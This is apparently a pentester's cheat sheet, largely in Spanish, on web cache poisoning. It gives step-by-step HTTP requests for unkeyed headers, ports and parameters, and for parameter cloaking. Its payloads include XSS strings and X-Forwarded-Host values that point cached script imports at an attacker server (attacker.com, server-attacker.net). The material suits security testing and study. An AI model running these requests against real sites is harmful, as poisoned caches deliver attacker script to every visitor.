# Web Cache Poisoning

Web cache poisoning is an advanced technique whereby an attacker exploits the behavior of a web server and cache so that a harmful HTTP response is served to other users.

## Summary

- [Tools](#tools)
- [Good Headers](#good-headers)
- [Local JS Files](#local-js-files)
- [Detección de Cache](#detección-de-cache)
	- [Puerto sin Clave](#puerto-sin-clave)
	- [Query String sin Clave](#query-string-sin-clave)
	- [Query Parameters sin Clave](#query-parameters-sin-clave)
	- [Cache Parameter Cloaking](#cache-parameter-cloacking)
	- [New Path en URL](#new-path-en-url)
	- [Enviar 20 Request con Headers Diferentes](#enviar-20-request-con-headers-diferentes)

## Tools

[Param Miner](https://github.com/PortSwigger/param-miner)

## Good Headers

Pruebe cada uno de los siguientes headers y verifique que se reflejan en su respuesta:
```
X-Forwarded-Proto: test
X-Forwarded-Scheme: test
X-Host: test
X-Original-URL: test
X-Forwarded-Host: test
```

Para sitios con Akamai:
```
Pragma: akamai-x-get-cache-key
```

## Local JS Files 

Una vez detectado el header `X-Cache: miss` o `X-Cache: hit` en la response, note que cuando carga un recurso, por ejemplo `https://vulnerable.com/` la respuesta devolverá algo similara a esto tal vez:

```html
HTTP/1.1 200 OK
Cache-Control: max-age=30
Age: 16
X-Cache: hit

<!DOCTYPE html>
<html>
    <head>
        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>
        <link href=/resources/css/labsEcommerce.css rel=stylesheet>
        <title>Web cache poisoning with multiple headers</title>
    </head>
    <body>
        <script type="text/javascript" src="/resources/js/tracking.js"></script>
            <script src="/resources/labheader/js/labHeader.js"></script>
```

Debe prestar especial atención a los scripts que se cargan de manera automática con el recurso que solicitó, en este caso `/resources/js/tracking.js`, dentro de la etiqueta `body`.

Luego, realice la llamada a dicho fichero JavaScript:

```
GET /resources/js/tracking.js HTTP/1.1
Host: vulnerable.com
```

Agregue alguno de estos dos headers a la request y observe su comportamiento (debe ser cualquier valor distinto a `https`):
```
GET /resources/js/tracking.js HTTP/1.1
Host: vulnerable.com
X-Forwarded-Proto: nothttp
X-Forwarded-Scheme: nothttp
```

Si la respuesta devuelve una redirección 302:
```
HTTP/1.1 302 Found
Location: https://vulnerable.com/resources/js/tracking.js
X-Cache: miss
```

Quiere decir que el sitio web genera dinámicamente un redireccionamiento a sí mismo que sí usa HTTPS. Luego, agregue algún header que le permita modificar el servidor de destino en el parámetro `Location`:

```
GET /resources/js/tracking.js HTTP/1.1
Host: vulnerable.com
X-Forwarded-Proto: nothttp
X-Forwarded-Scheme: nothttp
X-Forwarded-Host: attacker.com
```

La respuesta muestra:

```
HTTP/1.1 302 Found
Location: https://attacker.com/resources/js/tracking.js
X-Cache: miss
```

Note 2 situaciones:
- La primera es que el header de la response `X-Cache: miss` implica que la solicitud no se almacenó en caché y por lo tanto se buscó del servidor backend, y con `X-Cache: hit` quiere decir que la respuesta es buscada desde la memoria caché.
- El fichero `/resources/js/tracking.js` se carga automáticamente cuando usted visita la página principal de la aplicación, con lo cual si envenena la memoria caché con este fichero, el siguiente usuario que cargue la página web también cargará el fichero JS automáticamente y ejecutará su ataque contra él.

Desde su servidor atacante, cree un fichero que se llame igual a `/resources/js/tracking.js` y agregue el siguiente payload `alert(document.cookie)` para testear un posible XSS:

```
GET /resources/js/tracking.js HTTP/1.1
Host: vulnerable.com
X-Forwarded-Proto: nothttp
X-Forwarded-Scheme: nothttp
X-Forwarded-Host: server-attacker.net
```

La respuesta muestra:

```
HTTP/1.1 302 Found
Location: https://server-attacker.net/resources/js/tracking.js
X-Cache: miss
```

Luego, cargue la página víctima en su `/home` y verá el XSS reflejado.

## Detección de Cache

Investigar si la caché realiza algún procesamiento adicional de su entrada al generar la clave de caché. 

Está buscando una superficie de ataque adicional oculta dentro de componentes aparentemente codificados.

### Puerto sin Clave

Digamos que nuestro hipotético oráculo de caché es la página de inicio del sitio web de destino. Esto redirige automáticamente a los usuarios a una página específica de la región. Utiliza el header `Host` para generar dinámicamente el header `Location` en la respuesta:

```
GET / HTTP/1.1
Host: vulnerable-website.com

HTTP/1.1 302 Moved Permanently
Location: https://vulnerable-website.com/en
Cache-Status: miss
```

Para probar si el puerto está excluido de la clave de caché, primero debemos solicitar un puerto arbitrario y asegurarnos de recibir una nueva respuesta del servidor que refleje esta entrada:

```
GET / HTTP/1.1
Host: vulnerable-website.com:1337

HTTP/1.1 302 Moved Permanently
Location: https://vulnerable-website.com:1337/en
Cache-Status: miss
```

A continuación, enviaremos otra solicitud, pero esta vez no especificaremos un puerto:

```
GET / HTTP/1.1
Host: vulnerable-website.com

HTTP/1.1 302 Moved Permanently
Location: https://vulnerable-website.com:1337/en
Cache-Status: hit
```

Como puede ver, se nos ha entregado nuestra respuesta en caché aunque el header `Host` de la solicitud no especifica un puerto. 

Esto prueba que el puerto se excluye de la clave de caché. Es importante destacar que el header completo se pasa al código de la aplicación y se refleja en la respuesta.

### Query String sin Clave

Para identificar una página dinámica, debe observar cómo el cambio de un valor en el parámetro de la URL tiene un efecto en la respuesta. 

Si la URL no está codificada, la mayoría de las veces obtendrá un resultado de caché `X-Cache: hit` y, por lo tanto, una respuesta sin cambios, independientemente de los parámetros que agregue.

Afortunadamente, existen formas alternativas de agregar un cache buster, algunas alternativas son:

```
Accept-Encoding: gzip, deflate, cachebuster
Accept: */*, text/cachebuster
Cookie: cachebuster=1
Origin: https://cachebuster.vulnerable-website.com
```

Otro enfoque es ver si hay discrepancias entre cómo la caché y el back-end normalizan la URL. 

Como es casi seguro que la URL esté codificada, a veces puede aprovechar esto para emitir solicitudes con diferentes claves que llegan al mismo endpoint. 

Por ejemplo, las siguientes entradas pueden almacenarse en caché por separado pero tratarse como equivalentes en el backend `GET /`:


**Apache**:
```
GET //
```

**Nginx**: 
```
GET /%2F
```
**PHP**: 
```
GET /index.php/xyz
```
**.NET**: 
```
GET /(A(xyz)/
```

Se puede utilizar este enfoque para ver si agregando valores aleatorios en la request de la página principal es posible anexar algún valor que se refleje en la respuesta:

```
GET /?cgonzalo=1234
```

Si se refleja y no está sanitizado, puede escalar a un XSS:

```
GET /?evil='/><script>alert(1)</script>
```

### Query Parameters sin Clave

Algunos sitios web solo excluyen parámetros de consulta específicos que no son relevantes para la aplicación de back-end, como los parámetros de análisis o la publicación de anuncios dirigidos. 

Los parámetros UTM como `utm_content` son buenos candidatos para verificar durante las pruebas.

Es poco probable que los parámetros que se han excluido de la clave de caché tengan un impacto significativo en la respuesta. Lo más probable es que no haya ningún gadget útil que acepte la entrada de estos parámetros. Dicho esto, algunas páginas manejan la URL completa de una manera vulnerable, lo que hace posible explotar parámetros arbitrarios.

Envíe su request con un parámetro suyo y obtenga `X-Cache: miss` en la primera request:
```
GET /?cgonzalo=test1234
Host: vulnerable.com
```

Si se refleja, continúe agregando algún parámetro UTM (e.g. `utm_content`) para verificar que no se codifica ni sanitiza, y se agrega a su respuesta:
```
GET /?cgonzalo=test1234&utm_content=1337test
Host: vulnerable.com
```

Si se refleja, ingrese un payload XSS por ejemplo:
```
GET /?cgonzalo=test1234&utm_content='/><script>alert(1)</script>
Host: vulnerable.com
```

Luego, obtendrá un XSS. Ahora para que se masifique a cualquier usuario que ingrese al dominio principal, envíe únicamente la request con el parámetro `utm_content=<payload>`:
```
GET /?utm_content='/><script>alert(1)</script>
Host: vulnerable.com
```

### Cache Parameter Cloaking

Verifique siempre los ficheros JS que carga automáticamente cada aplicación web.

Los delimitadores `&` y `;` pueden ser utilizados para romper la sintaxis de la Cache y el Backend dependiendo el contexto y la tecnología utilizada.

Considere la siguiente solicitud:

```
GET /?callback=abc&excluded_param=123;callback=bad-stuff-here
```

El parámetro `callback` se incluye en la clave de caché, pero `excluded_param` no lo está. Muchas cachés solo interpretarán esto como dos parámetros, delimitados por el `&`:

1. `callback=abc`
2. `excluded_param=123;callback=bad-stuff-here`

Una vez que el algoritmo de análisis elimina el `excluded_param`, la clave de caché solo contendrá `callback=abc`. Sin embargo, en el back-end, Ruby on Rails ve el punto y coma y divide la cadena de consulta en tres parámetros separados:

1. `callback=abc`
2. `excluded_param=123`
3. `callback=bad-stuff-here`

Pero ahora hay un parámetro duplicado `callback`.

Aquí es donde entra en juego la segunda peculiaridad. Si hay parámetros duplicados, cada uno con valores diferentes, Ruby on Rails da prioridad a la ocurrencia final. El resultado final es que la clave de caché contiene un valor de parámetro esperado inocente, lo que permite que la respuesta en caché se sirva normalmente a otros usuarios. Sin embargo, en el back-end, el mismo parámetro tiene un valor completamente diferente, que es nuestra carga útil inyectada. Es este segundo valor el que se pasará al dispositivo y se reflejará en la respuesta envenenada.

Bien, en alguna request con parámetros GET:
```
GET /js/geolocate.js?callback=setCountryCookie
Host: vulnerable.com
```

Intente concatenar parámetro con `&` y `;`:
```
GET /js/geolocate.js?callback=setCountryCookie&utm_content=foo;callback=arbitraryFunction
Host: vulnerable.com
```

Observando que la respuesta muestra correctamente el valor insertado en el parámetro `arbitraryFunction` reflejada en el fichero JSON, inserte `alert(8)`, y luego, cuando cargue la página principal de la aplicación, su XSS será ejecutado:
```
GET /js/geolocate.js?callback=setCountryCookie&utm_content=foo;callback=alert(8)
Host: vulnerable.com
```

Adicionalmente, intente agregar un parámetro en la request para confundir a la Cache con solicitud `GET/POST` y aprovechar el soporte fat GET:
```
GET /js/geolocate.js?callback=setCountryCookie
Host: vulnerable.com

callback=alert(8)
```

Este último enfoque solo es posible si el servidor acepta solicitudes `GET` con un `body`. 

Otro enfoque es agregar un nuevo header `X-HTTP-Method-Override: POST` para anular el método `GET` por default:

```
GET /js/geolocate.js?callback=setCountryCookie
Host: vulnerable.com
X-HTTP-Method-Override: POST

callback=alert(8)
```

Envíe la request hasta que envenenar la caché correctamente.

### New Path en URL

Otro enfoque que puede utilizar es el de agregar un PATH a la URL del home de la página:
```
GET /random
Host: vulnerable.com
```

Si se refleja en un mensaje de error, agregar el payload XSS:
```
GET /random</[etiquetaCierre]><script>alert(1)</script><[etiquetaApertura]>foo
Host: vulnerable.com
```

### Enviar 20 Request con Headers Diferentes

Es recomendable agregar diferentes headers en la response, **a veces** junto con un cache buster como parámetro, y enviarlos varias veces para validar si el comportamiento de la memoria cache almacena en la respuesta de la aplicación dichos valores enviados:
```
GET /?holis=test123 HTTP/1.1
Host: vulnerable.com
X-Forwarded-Host: cgonzalo
```

Si en la respuesta observa la frase `cgonzalo`, analice en qué lugar se refleja. Si es como en este caso al importar un fichero JS, agregue su servidor atacante con un fichero nombrado igual al que llama la aplicación `/js/geolocate.js`  cuando se carga el recurso `/home`, y agregue un payload XSS en él:

```
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8

<!DOCTYPE html>
<html>
    <head>
        <link rel="canonical" href='//cgonzalo/?asassd=asssda'/>
    </head>
    <body>
        <script type="text/javascript" src="//cgonzalo/resources/js/analytics.js"></script>
        <script src=//cgonzalo/js/geolocate.js?callback=loadCountry></script>
```
